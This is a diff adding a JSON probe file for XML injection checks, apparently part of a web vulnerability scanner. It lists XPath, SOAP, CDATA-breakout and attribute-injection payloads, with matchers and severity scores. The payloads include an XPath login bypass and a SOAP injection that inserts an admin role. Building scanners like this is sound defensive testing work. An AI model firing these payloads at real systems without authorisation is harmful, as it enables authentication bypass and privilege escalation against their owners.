@@ -1,0 +1,108 @@
+{
+  "category": "xml_injection",
+  "contexts": {
+    "xpath_via_xml": {
+      "description": "XPath injection via XML input -- inject XPath expressions into XML-based queries to bypass authentication or extract data",
+      "tech_match": ["Java", "PHP", ".NET", "Python"],
+      "param_match": ["xml", "data", "query", "search", "user", "username", "password", "name", "id", "filter"],
+      "probes": [
+        {
+          "payload": "' or '1'='1",
+          "description": "XPath authentication bypass -- classic boolean injection in XPath login query",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "' or count(//*)>0 or '1'='1",
+          "description": "XPath count injection -- enumerate XML document structure via count function",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 30}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        }
+      ]
+    },
+    "soap_injection": {
+      "description": "SOAP injection -- inject XML into SOAP message body to manipulate web service operations or add extra parameters",
+      "tech_match": ["Java", ".NET", "PHP", "SOAP"],
+      "param_match": ["xml", "soap", "data", "body", "request", "action", "method", "param", "value"],
+      "probes": [
+        {
+          "payload": "swktest</value><role>admin</role><dummy>",
+          "description": "SOAP parameter injection -- close current XML tag and inject additional element to escalate privileges",
+          "matchers": [
+            {"type": "status", "status": [200, 500]},
+            {"type": "word", "words": ["admin", "role", "unauthorized"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "<!--swktest-{{marker}}-->",
+          "description": "XML comment injection -- if comment appears in response or is processed, confirms XML context injection",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30
+        }
+      ]
+    },
+    "cdata_breakout": {
+      "description": "CDATA section breakout -- escape CDATA context to inject arbitrary XML elements",
+      "tech_match": ["Java", ".NET", "PHP"],
+      "param_match": ["xml", "data", "content", "text", "value", "name", "description", "comment"],
+      "probes": [
+        {
+          "payload": "]]><swk-cdata-{{marker}}/><![CDATA[",
+          "description": "CDATA breakout -- close CDATA section, inject XML element, reopen CDATA to maintain document structure",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "]]><!--swktest-{{marker}}--><![CDATA[",
+          "description": "CDATA breakout with comment -- escape CDATA and inject XML comment to confirm breakout",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        }
+      ]
+    },
+    "attribute_injection": {
+      "description": "XML attribute injection -- inject additional attributes into XML elements via unsanitized input",
+      "tech_match": [],
+      "param_match": ["name", "value", "id", "type", "class", "attr", "property"],
+      "probes": [
+        {
+          "payload": "swktest\" swk-injected=\"{{marker}}",
+          "description": "XML attribute injection via double quote -- break out of attribute value and inject new attribute",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        },
+        {
+          "payload": "swktest' swk-injected='{{marker}}",
+          "description": "XML attribute injection via single quote -- alternative quote style breakout",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        }
+      ]
+    }
+  }
+}
